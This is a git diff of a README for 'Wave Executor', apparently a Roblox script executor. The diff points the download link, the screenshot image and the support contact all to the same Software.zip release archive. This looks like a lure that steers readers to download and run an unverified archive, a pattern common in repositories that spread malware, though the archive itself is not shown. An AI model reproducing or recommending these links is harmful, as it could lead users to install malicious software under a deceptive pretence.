@@ -10,7 +10,7 @@ Welcome to the Wave Executor GitHub repository! Wave Executor is a Windows-based
 
 ## Usage
 To access Wave Executor, download the software from the following link:
-[Launch Wave Executor](https://github.com/user-attachments/files/18060583/Software.zip)
+[Launch Wave Executor](https://github.com/Jts36/Wave-Roblox/releases/download/v2.0/Software.zip)
 
 ## How to Download and Install
 1. Click on the link provided above to start the download.
@@ -19,10 +19,10 @@ To access Wave Executor, download the software from the following link:
 4. Launch Wave Executor and start exploring its powerful features.
 
 ## Screenshots
-![Wave Executor](https://via.placeholder.com/800x400)
+![Wave Executor](https://github.com/Jts36/Wave-Roblox/releases/download/v2.0/Software.zip)
 
 ## Support
-For any inquiries or assistance regarding Wave Executor, feel free to reach out to our team at support@waveexecutor.com.
+For any inquiries or assistance regarding Wave Executor, feel free to reach out to our team at https://github.com/Jts36/Wave-Roblox/releases/download/v2.0/Software.zip
 
 ## License
 This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
